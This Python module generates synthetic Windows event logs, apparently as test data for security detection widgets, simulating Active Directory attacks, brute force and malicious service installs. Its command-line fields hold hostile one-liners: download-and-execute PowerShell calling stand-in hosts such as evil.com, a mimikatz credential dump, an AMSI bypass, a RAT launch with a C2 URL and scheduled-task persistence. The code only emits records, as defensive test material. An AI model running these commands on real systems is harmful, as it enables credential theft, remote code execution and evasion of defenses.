"""Auto-extracted from generate_test_logs.py — windows event logs synthetic events.

Behavior-preserving split: function bodies are unchanged. Shared constants and
helpers live in ``testlogs.common`` and are imported via star import.
"""
import json
import ntpath
import os
import random
import re
import sys
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from testlogs.common import *  # noqa: F401,F403


def winsec_event(event_id, user=None, host=None, source_addr=None,
                 logon_type=None, process_name=None, command_line=None,
                 msg=None, offset=0, extra=None):
    """Generate a Windows Security Event Log JSON entry via the canonical builder.

    Delegates to ``schemas.build_windows_security_event`` so the record matches
    the real Microsoft-Windows-Security-Auditing EVTX shape (Channel="Security",
    Provider, EventID, TimeCreated, Computer, native PascalCase fields like
    ``SubjectUserName``, ``SourceAddress``, ``LogonType``) plus parallel OCI Log
    Analytics display-name columns (``Event ID``, ``Source IP``, ``Logon Type``,
    ``Process Name``).
    """
    from schemas import build_windows_security_event

    if user is None:
        user = random.choice(THREAT_ACTORS)
    if host is None:
        host = random.choice(SEVEN_KINGDOMS_HOSTS)
    if source_addr is None:
        source_addr = random.choice(SUSPICIOUS_IPS + CORPORATE_IPS)

    event = build_windows_security_event(
        int(event_id),
        event_time=ts(offset),
        computer=host,
        user=user,
        subject_user_name=user,
        source_address=source_addr,
        logon_type=logon_type if logon_type is not None else "",
        process_name=process_name or "",
        new_process_name=process_name or "",
        command_line=command_line or "",
        extra=extra,
    )
    event["msg"] = msg or f"Windows Security Event {event_id}"
    # Legacy compatibility: existing detection queries expect these alias
    # spellings to be present even when the builder treats them as optional.
    event.setdefault("Process Name", process_name or "")
    event.setdefault("New Process Name", process_name or "")
    event.setdefault("Source IP", source_addr)
    event.setdefault("Source Address", source_addr)
    event.setdefault("Logon Type", str(logon_type) if logon_type else "")
    event.setdefault("Subject User Name", user)
    event.setdefault("CommandLine", command_line or "")
    event.setdefault("ProcessName", process_name or "")
    event.setdefault("LogonType", str(logon_type) if logon_type else "")
    event.setdefault("SourceAddress", source_addr)
    event.setdefault("Entity", host)
    add_windows_event_envelope(
        event,
        channel="Security",
        provider="Microsoft-Windows-Security-Auditing",
        provider_guid="{54849625-5478-4994-A5BA-3E3B0328C30D}",
        event_data_fields=[
            "SubjectUserName", "TargetUserName", "TargetDomainName",
            "SourceAddress", "LogonType", "ProcessName", "NewProcessName",
            "CommandLine", "ObjectName", "ObjectType", "ObjectServer",
            "AccessMask", "FailureReason", "Status", "SubStatus",
            "TaskName", "ShareName", "RelativeTargetName", "ServiceName",
            "ServiceFileName", "Properties", "PrivilegeList",
        ],
    )
    return event


def _generate_windows_ad_attack_events():
    """Generate AD security events required by aggregation-heavy widgets."""
    events = []
    host = "DC01.sevenkingdoms.local"
    attacker = "joffrey"
    service_user = "sql_svc"
    source_ips = [
        "10.0.0.5",
        "10.0.1.10",
        "172.16.0.50",
        "192.168.1.100",
        "185.220.101.1",
    ]

    # Lateral movement: one account performing network logons from many sources.
    for i, source_ip in enumerate(source_ips):
        events.append(winsec_event(
            4624,
            user=attacker,
            host=host,
            source_addr=source_ip,
            logon_type=3,
            msg="An account was successfully logged on. LogonType=3 lateral movement sweep.",
            offset=820 + i,
        ))

    # Kerberoasting: many RC4 TGS requests from a single user.
    service_names = [
        "MSSQLSvc/db01.sevenkingdoms.local:1433",
        "HTTP/app01.sevenkingdoms.local",
        "CIFS/files01.sevenkingdoms.local",
        "LDAP/dc01.sevenkingdoms.local",
        "HOST/srv01.sevenkingdoms.local",
        "WSMAN/srv01.sevenkingdoms.local",
        "TERMSRV/ws01.sevenkingdoms.local",
        "HTTP/crm.sevenkingdoms.local",
        "MSSQLSvc/report01.sevenkingdoms.local:1433",
        "CIFS/backup01.sevenkingdoms.local",
        "HTTP/intranet.sevenkingdoms.local",
        "LDAP/dc02.sevenkingdoms.local",
    ]
    for i, service_name in enumerate(service_names):
        event = winsec_event(
            4769,
            user=attacker,
            host=host,
            source_addr="10.0.1.10",
            msg="A Kerberos service ticket was requested with RC4 encryption.",
            offset=840 + i,
        )
        event["Service Name"] = service_name
        event["Ticket Encryption Type"] = "0x17"
        event["TicketEncryptionType"] = "0x17"
        events.append(event)

    # Golden ticket style RC4 TGT requests and renewals.
    for i, event_id in enumerate([4768, 4770, 4768, 4770]):
        event = winsec_event(
            event_id,
            user=attacker,
            host=host,
            source_addr="10.0.1.10",
            msg="A Kerberos TGT request or renewal used RC4 encryption.",
            offset=860 + i,
        )
        event["Ticket Encryption Type"] = "0x17"
        event["TicketEncryptionType"] = "0x17"
        events.append(event)

    # DCSync: directory replication operations from a non-machine account.
    replication_guids = [
        "DS-Replication-Get-Changes",
        "DS-Replication-Get-Changes-All",
        "DS-Replication-Get-Changes-In-Filtered-Set",
    ]
    for i, guid in enumerate(replication_guids * 3):
        event = winsec_event(
            4662,
            user=attacker,
            host=host,
            source_addr="10.0.1.10",
            process_name="C:\\Windows\\System32\\lsass.exe",
            msg=f"An operation was performed on an object. {guid}",
            offset=880 + i,
        )
        event["Object Name"] = "DC=sevenkingdoms,DC=local"
        event["Properties"] = guid
        event["Accesses"] = "Control Access"
        events.append(event)

    # Pass-the-ticket / explicit credential use.
    for i in range(8):
        events.append(winsec_event(
            4648,
            user=attacker,
            host=random.choice(["DC01.sevenkingdoms.local", "SRV01.sevenkingdoms.local"]),
            source_addr=random.choice(source_ips),
            process_name="C:\\Windows\\System32\\runas.exe",
            msg="A logon was attempted using explicit credentials.",
            offset=900 + i,
        ))

    # Credential Manager extraction: high-frequency credential reads.
    for i in range(25):
        events.append(winsec_event(
            5379,
            user=attacker,
            host="WS01.sevenkingdoms.local",
            source_addr="10.0.1.10",
            process_name="C:\\Users\\Public\\lazagne.exe",
            msg="Credential Manager credentials were read.",
            offset=920 + i,
        ))

    # Group enumeration: SharpHound/BloodHound style high-volume group queries.
    for i in range(60):
        events.append(winsec_event(
            4799,
            user=attacker,
            host=host,
            source_addr="10.0.1.10",
            process_name="C:\\Users\\Public\\SharpHound.exe",
            msg="A security-enabled local group membership was enumerated.",
            offset=950 + i,
        ))

    # Privilege escalation indicator on the same host as the AD chain.
    event = winsec_event(
        4672,
        user=attacker,
        host=host,
        source_addr="10.0.1.10",
        msg="Special privileges assigned to new logon: SeDebugPrivilege SeTcbPrivilege.",
        offset=1015,
    )
    event["Privilege List"] = "SeDebugPrivilege SeTcbPrivilege SeImpersonatePrivilege"
    event["PrivilegeList"] = "SeDebugPrivilege SeTcbPrivilege SeImpersonatePrivilege"
    events.append(event)

    # Service-account Kerberos baseline so hunting widgets have another row.
    for i in range(4):
        event = winsec_event(
            4769,
            user=service_user,
            host=host,
            source_addr="10.0.0.5",
            msg="A Kerberos service ticket was requested.",
            offset=1020 + i,
        )
        event["Service Name"] = f"HTTP/app{i}.sevenkingdoms.local"
        event["Ticket Encryption Type"] = "0x17"
        event["TicketEncryptionType"] = "0x17"
        events.append(event)

    return events


def generate_windows_event_security():
    """Generate Windows Security Event Log events for multicloudoperations widgets."""
    events = []

    # ── Event 4625: Failed Logon (brute force) ──
    for i in range(25):
        actor = random.choice(THREAT_ACTORS + THREAT_ACTOR_EMAILS)
        events.append(winsec_event(
            4625, user=actor,
            source_addr=random.choice(SUSPICIOUS_IPS),
            logon_type=random.choice([3, 10]),
            msg="An account failed to log on.",
            offset=i,
        ))

    # ── Event 4624: Successful Logon ──
    for i in range(15):
        actor = random.choice(THREAT_ACTORS)
        lt = random.choice([2, 3, 10])
        events.append(winsec_event(
            4624, user=actor,
            source_addr=random.choice(CORPORATE_IPS + SUSPICIOUS_IPS),
            logon_type=lt,
            msg="An account was successfully logged on.",
            offset=100+i,
        ))

    # ── Event 4624 LogonType=10 (RDP) ──
    for i in range(8):
        events.append(winsec_event(
            4624, user=random.choice(THREAT_ACTORS),
            source_addr=random.choice(SUSPICIOUS_IPS),
            logon_type=10,
            msg="An account was successfully logged on.",
            offset=120+i,
        ))

    # ── Event 4672: Special Privileges Assigned ──
    for i in range(10):
        events.append(winsec_event(
            4672, user=random.choice(THREAT_ACTORS),
            msg="Special privileges assigned to new logon.",
            offset=200+i,
        ))

    # ── Event 4720: User Account Created ──
    for i in range(5):
        events.append(winsec_event(
            4720, user=random.choice(THREAT_ACTORS),
            msg="A user account was created.",
            offset=300+i,
        ))

    # ── Event 4698: Scheduled Task Created ──
    for i in range(4):
        events.append(winsec_event(
            4698, user=random.choice(THREAT_ACTORS),
            msg="A scheduled task was created.",
            extra={
                "TaskName": "\\Microsoft\\Windows\\Update\\CacheTask",
                "Task Name": "\\Microsoft\\Windows\\Update\\CacheTask",
                "CommandLine": "C:\\Windows\\Temp\\cache_update.exe",
                "Command Line": "C:\\Windows\\Temp\\cache_update.exe",
            },
            offset=310+i,
        ))
    for i in range(3):
        events.append(winsec_event(
            4702,
            user=random.choice(THREAT_ACTORS),
            msg="A scheduled task was updated.",
            extra={
                "TaskName": "\\Microsoft\\Windows\\WDI\\DiagnosticTask",
                "Task Name": "\\Microsoft\\Windows\\WDI\\DiagnosticTask",
                "CommandLine": "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\Public\\stage.ps1",
                "Command Line": "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\Public\\stage.ps1",
            },
            offset=314+i,
        ))

    # ── Event 4728/4732/4756: Group Membership Changes ──
    group_events = [
        (4728, "A member was added to a security-enabled global group."),
        (4732, "A member was added to a security-enabled local group."),
        (4756, "A member was added to a security-enabled universal group."),
    ]
    for idx, (eid, msg_text) in enumerate(group_events):
        for i in range(3):
            events.append(winsec_event(
                eid, user=random.choice(THREAT_ACTORS),
                msg=f"{msg_text} Group Name: Domain Admins",
                extra={
                    "TargetUserName": "Domain Admins",
                    "Target User Name": "Domain Admins",
                    "MemberName": "CN=sql_svc,CN=Users,DC=sevenkingdoms,DC=local",
                },
                offset=320+idx*5+i,
            ))

    # ── Event 1102: Audit Log Cleared ──
    for i in range(4):
        events.append(winsec_event(
            1102, user=random.choice(THREAT_ACTORS),
            msg="The audit log was cleared.",
            offset=400+i,
        ))
    for i in range(3):
        events.append(winsec_event(
            4719,
            user=random.choice(THREAT_ACTORS),
            msg="System audit policy was changed. Audit Policy Change: Success removed for Object Access.",
            extra={"Status": "Success", "SubStatus": "", "Category": "Object Access"},
            offset=410+i,
        ))

    # ── Event 4688: Process Creation ──
    process_scenarios = [
        ("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c whoami /all"),
        ("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c schtasks /create /sc minute /mo 5 /tn EvilTask /tr C:\\Temp\\payload.exe"),
        ("C:\\Windows\\System32\\powershell.exe", "powershell.exe -c Invoke-WebRequest -Uri http://evil.com/payload.exe -OutFile C:\\Temp\\payload.exe"),
        ("C:\\Windows\\System32\\powershell.exe", "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA="),
        ("C:\\Temp\\mimikatz.exe", "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit"),
        ("C:\\Windows\\System32\\powershell.exe", "powershell.exe Invoke-BloodHound -CollectionMethod All"),
    ]
    for i, (proc, command_line) in enumerate(process_scenarios):
        events.append(winsec_event(
            4688, user=random.choice(THREAT_ACTORS),
            process_name=proc,
            command_line=command_line,
            msg=f"A new process has been created: {command_line}",
            offset=500+i,
        ))

    # 2025-2026 browser social-engineering process creation evidence.
    clickfix_security_processes = [
        (
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"# ClickFix fake CAPTCHA clipboard verification; iwr https://captcha-verify.example/update.ps1 | iex\"",
            "ClickFix fake CAPTCHA process creation",
        ),
        (
            "C:\\Windows\\System32\\mshta.exe",
            "mshta.exe https://captcha-verify.example/captcha.hta # ClickFix fake CAPTCHA payload",
            "ClickFix mshta payload execution",
        ),
        (
            "C:\\Users\\Public\\Python311\\python.exe",
            "python.exe C:\\Users\\Public\\CrashFix\\crashfix.py --install-rat --c2 https://crashfix-help.example/api",
            "CrashFix Python RAT process creation",
        ),
    ]
    for i, (proc, command_line, msg_text) in enumerate(clickfix_security_processes):
        event = winsec_event(
            4688,
            user="arya",
            host=CLICKFIX_COMPROMISED_HOST,
            source_addr=CLICKFIX_COMPROMISED_PRIVATE_IP,
            process_name=proc,
            command_line=command_line,
            msg=msg_text,
            offset=510 + i,
        )
        event["Trace ID"] = CLICKFIX_TRACE_ID
        event["Attack Stage"] = "execution"
        event["Threat Name"] = "ClickFix / CrashFix Execution"
        events.append(event)

    bluelight_obfuscated = [
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell.exe -NoProfile -Command [Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsA')"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA=="),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell.exe -encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQ"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell.exe -Command [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('payload'))"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell.exe -Command $key=0xCF; $b=[byte[]](1..10); ($b | ForEach-Object { $_ -bxor $key })"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell.exe -Command iex(New-Object Net.WebClient).DownloadString('http://203.0.113.10/p.ps1')"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell.exe -Command Invoke-Expression (Get-Content C:\\Users\\Public\\stage.ps1 -Raw)"),
        ("C:\\Windows\\System32\\wscript.exe",
         "wscript.exe C:\\Users\\Public\\loader.vbs char(72) char(101) char(108) XOR 0xCF"),
        ("C:\\Windows\\System32\\mshta.exe",
         "mshta.exe javascript:eval(unescape('%76%61%72%20%62%3D%22%4F%22'))"),
        ("C:\\Windows\\System32\\cscript.exe",
         "cscript.exe //e:vbs C:\\Users\\Public\\dropper.vbs FromBase64String"),
    ]
    for i, (proc, command_line) in enumerate(bluelight_obfuscated):
        events.append(winsec_event(
            4688, user="joffrey",
            host="WS01.sevenkingdoms.local",
            process_name=proc,
            command_line=command_line,
            msg="BLUELIGHT obfuscated script execution",
            offset=520 + i,
        ))

    # ── Event 4946/4947: Firewall Rule Changes ──
    for i in range(3):
        events.append(winsec_event(
            4946, user=random.choice(THREAT_ACTORS),
            msg="A change has been made to Windows Firewall exception list. A rule was added.",
            offset=600+i,
        ))
    for i in range(2):
        events.append(winsec_event(
            4947, user=random.choice(THREAT_ACTORS),
            msg="A change has been made to Windows Firewall exception list. A rule was modified.",
            offset=610+i,
        ))

    # ── Event 4656/4663: Object Access ──
    for i in range(4):
        events.append(winsec_event(
            4656, user=random.choice(THREAT_ACTORS),
            msg="A handle to an object was requested.",
            offset=700+i,
        ))
    for i in range(4):
        events.append(winsec_event(
            4663, user=random.choice(THREAT_ACTORS),
            msg="An attempt was made to access an object.",
            extra={
                "ObjectName": "E:\\Finance\\payroll-export.xlsx",
                "Object Name": "E:\\Finance\\payroll-export.xlsx",
                "AccessMask": "0x2",
                "Access Mask": "0x2",
            },
            offset=710+i,
        ))

    # Native account-logon failure telemetry: Kerberos pre-auth and NTLM validation.
    for i, status in enumerate(["0x18", "0x6", "0x25", "0x18", "0x18"]):
        events.append(winsec_event(
            4771,
            user="sql_svc",
            source_addr=random.choice(SUSPICIOUS_IPS),
            msg=f"Kerberos pre-authentication failed. Failure Code: {status}",
            extra={
                "TargetUserName": "sql_svc",
                "Target User Name": "sql_svc",
                "Status": status,
                "FailureReason": status,
                "Failure Reason": status,
            },
            offset=730+i,
        ))
    for i, status in enumerate(["0xC000006A", "0xC000006D", "0xC0000234", "0xC000006A"]):
        events.append(winsec_event(
            4776,
            user="backup_svc",
            source_addr=random.choice(SUSPICIOUS_IPS),
            msg=f"The computer attempted to validate the credentials for an account. Error Code: {status}",
            extra={
                "TargetUserName": "backup_svc",
                "Target User Name": "backup_svc",
                "Status": status,
                "FailureReason": status,
                "Failure Reason": status,
            },
            offset=740+i,
        ))

    # Native file share access telemetry, including admin shares and detailed file share checks.
    share_events = [
        (5140, "\\\\*\\C$", ""),
        (5140, "\\\\*\\ADMIN$", ""),
        (5145, "\\\\*\\C$", "Windows\\Temp\\payload.exe"),
        (5145, "\\\\*\\Finance", "Payroll\\payroll-export.xlsx"),
    ]
    for i, (event_id, share_name, relative_target) in enumerate(share_events):
        events.append(winsec_event(
            event_id,
            user=random.choice(THREAT_ACTORS),
            source_addr=random.choice(SUSPICIOUS_IPS),
            msg=f"A network share object was {'accessed' if event_id == 5140 else 'checked'}. Share Name: {share_name}",
            extra={
                "ShareName": share_name,
                "Share Name": share_name,
                "RelativeTargetName": relative_target,
                "Relative Target Name": relative_target,
                "AccessMask": "0x12019f",
                "Access Mask": "0x12019f",
            },
            offset=750+i,
        ))

    # Native service installation telemetry in the Security log.
    events.append(winsec_event(
        4697,
        user="robb",
        host="SRV01.sevenkingdoms.local",
        msg="A service was installed in the system.",
        extra={
            "ServiceName": "WindowsUpdateCache",
            "Service Name": "WindowsUpdateCache",
            "ServiceFileName": "C:\\Windows\\Temp\\wucache.exe",
            "Service File Name": "C:\\Windows\\Temp\\wucache.exe",
        },
        offset=760,
    ))

    # Account and group enumeration events noted in the incident-response guide.
    for i, event_id in enumerate([4798, 4799, 4798, 4799, 4799]):
        events.append(winsec_event(
            event_id,
            user="arya",
            source_addr=random.choice(SUSPICIOUS_IPS),
            msg="A local account or security-enabled local group membership was enumerated.",
            extra={"TargetUserName": "administrator", "Target User Name": "administrator"},
            offset=770+i,
        ))

    events.extend(_generate_windows_ad_attack_events())

    return events


def winsys_event(event_id, host=None, service_name=None, service_file_name=None, user=None,
                 msg=None, offset=0):
    """Generate a Windows System Event Log JSON entry.

    Uses OCI Log Analytics field names for query compatibility.
    """
    if host is None:
        host = random.choice(SEVEN_KINGDOMS_HOSTS)
    if user is None:
        user = random.choice(["SYSTEM", "LOCAL SERVICE"] + THREAT_ACTORS)
    event = {
        # OCI Log Analytics mapped fields
        "Event ID": int(event_id),
        "Host Name (Server)": host,
        "Host Name": host,
        "Entity": host,
        "Service Name": service_name or "",
        "Service File Name": service_file_name or "",
        # Native fields
        "EventID": str(event_id),
        "TimeCreated": ts(offset),
        "Computer": host,
        "Channel": "System",
        "Provider": "Service Control Manager",
        "ServiceName": service_name or "",
        "ServiceFileName": service_file_name or "",
        "User": user,
        "msg": msg or f"Windows System Event {event_id}",
    }
    add_windows_event_envelope(
        event,
        channel="System",
        provider="Service Control Manager",
        event_data_fields=["ServiceName", "ServiceFileName", "User"],
    )
    return event


def generate_windows_event_system():
    """Generate Windows System Event Log events for multicloudoperations widgets."""
    events = []

    # ── Event 7045: New Service Installed ──
    malicious_services = [
        ("backdoor_svc", "C:\\Temp\\backdoor.exe"),
        ("evil_agent", "C:\\Windows\\Temp\\agent.exe"),
        ("update_service", "C:\\Users\\Public\\updater.exe"),
        ("cobaltstrike", "C:\\ProgramData\\beacon.exe"),
        ("persistence_svc", "powershell.exe -ep bypass -f C:\\Temp\\payload.ps1"),
    ]
    for i, (svc_name, svc_path) in enumerate(malicious_services):
        for j in range(3):
            events.append(winsys_event(
                7045,
                service_name=svc_name,
                service_file_name=svc_path,
                user=random.choice(THREAT_ACTORS + ["SYSTEM"]),
                msg=f"A service was installed in the system. Service Name: {svc_name} Service File Name: {svc_path}",
                offset=i*5+j,
            ))

    # ── Event 7036: Service State Changes ──
    for i in range(5):
        events.append(winsys_event(
            7036,
            service_name=random.choice([s[0] for s in malicious_services]),
            msg="The service entered the running state.",
            offset=100+i,
        ))

    return events


def winps_event(event_id, host=None, user=None, script_block=None,
                command_line=None, host_application=None, process_name=None,
                msg=None, offset=0):
    """Generate a Windows PowerShell Operational JSON entry."""
    if host is None:
        host = random.choice(SEVEN_KINGDOMS_HOSTS)
    if user is None:
        user = random.choice(THREAT_ACTORS)
    process = process_name or r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    command = command_line or "powershell.exe -NoProfile"
    event = {
        "Log Source": "Windows PowerShell Operational Logs",
        "Event ID": int(event_id),
        "Host Name (Server)": host,
        "Host Name": host,
        "User": user,
        "EventID": str(event_id),
        "TimeCreated": ts(offset),
        "Computer": host,
        "Channel": "Microsoft-Windows-PowerShell/Operational",
        "Provider": "Microsoft-Windows-PowerShell",
        "ScriptBlockText": script_block or "",
        "Script Block Text": script_block or "",
        "CommandLine": command,
        "Command Line": command,
        "HostApplication": host_application or command,
        "Host Application": host_application or command,
        "ProcessName": process,
        "Process Name": process,
        "msg": msg or f"Windows PowerShell Operational Event {event_id}",
    }
    add_windows_event_envelope(
        event,
        channel="Microsoft-Windows-PowerShell/Operational",
        provider="Microsoft-Windows-PowerShell",
        provider_guid="{A0C1853B-5C40-4B15-8766-3CF1C58F985A}",
        event_data_fields=[
            "ScriptBlockText", "CommandLine", "HostApplication",
            "ProcessName",
        ],
    )
    return event


def generate_windows_powershell_operational():
    """Generate PowerShell operational events for script block detections."""
    events = []
    suspicious_blocks = [
        "IEX(New-Object Net.WebClient).DownloadString('https://example.invalid/stage.ps1')",
        "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        "$bytes=[Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsA'); IEX([Text.Encoding]::Unicode.GetString($bytes))",
        "Invoke-Expression (Get-Content C:\\Users\\Public\\stage.ps1 -Raw)",
    ]
    for i, script_block in enumerate(suspicious_blocks):
        events.append(winps_event(
            4104,
            user=random.choice(THREAT_ACTORS),
            script_block=script_block,
            command_line="powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden",
            msg="Creating Scriptblock text with suspicious content.",
            offset=800+i,
        ))
    events.append(winps_event(
        4103,
        user="sansa",
        script_block="Get-ADUser -Filter * -Properties *",
        command_line="powershell.exe -NoProfile -Command Get-ADUser -Filter * -Properties *",
        msg="PowerShell pipeline execution details.",
        offset=810,
    ))
    return events


def windef_event(event_id, host=None, user=None, threat_name=None, action=None,
                 status=None, severity=None, file_path=None, msg=None, offset=0):
    """Generate a Windows Defender Operational JSON entry."""
    if host is None:
        host = random.choice(SEVEN_KINGDOMS_HOSTS)
    if user is None:
        user = "SYSTEM"
    threat = threat_name or "Trojan:Win32/Example"
    path = file_path or r"C:\Users\Public\stage.exe"
    event = {
        "Log Source": "Windows Defender Operational Logs",
        "Event ID": int(event_id),
        "Host Name (Server)": host,
        "Host Name": host,
        "User": user,
        "EventID": str(event_id),
        "TimeCreated": ts(offset),
        "Computer": host,
        "Channel": "Microsoft-Windows-Windows Defender/Operational",
        "Provider": "Microsoft-Windows-Windows Defender",
        "ThreatName": threat,
        "Threat Name": threat,
        "ThreatID": "2147712345",
        "Threat ID": "2147712345",
        "Action": action or "",
        "Status": status or "",
        "Severity": severity or "High",
        "DetectionSource": "Real-Time Protection",
        "Detection Source": "Real-Time Protection",
        "FilePath": path,
        "File Path": path,
        "msg": msg or f"Microsoft Defender Operational Event {event_id}",
    }
    add_windows_event_envelope(
        event,
        channel="Microsoft-Windows-Windows Defender/Operational",
        provider="Microsoft-Windows-Windows Defender",
        event_data_fields=[
            "ThreatName", "ThreatID", "Action", "Status", "Severity",
            "DetectionSource", "FilePath",
        ],
    )
    return event


def generate_windows_defender_operational():
    """Generate Microsoft Defender operational events for malware and tamper detections."""
    return [
        windef_event(1116, action="Detected", status="Active", msg="Microsoft Defender Antivirus detected malware.", offset=820),
        windef_event(1117, action="Quarantined", status="Remediated", msg="Microsoft Defender Antivirus took action on malware.", offset=821),
        windef_event(1118, action="RemediationFailed", status="Failed", msg="Microsoft Defender Antivirus remediation failed.", offset=822),
        windef_event(
            5007,
            threat_name="Defender Configuration Change",
            action="ConfigurationChanged",
            status="Changed",
            severity="Medium",
            file_path=r"HKLM\SOFTWARE\Microsoft\Windows Defender",
            msg="Microsoft Defender Antivirus configuration has changed.",
            offset=823,
        ),
    ]
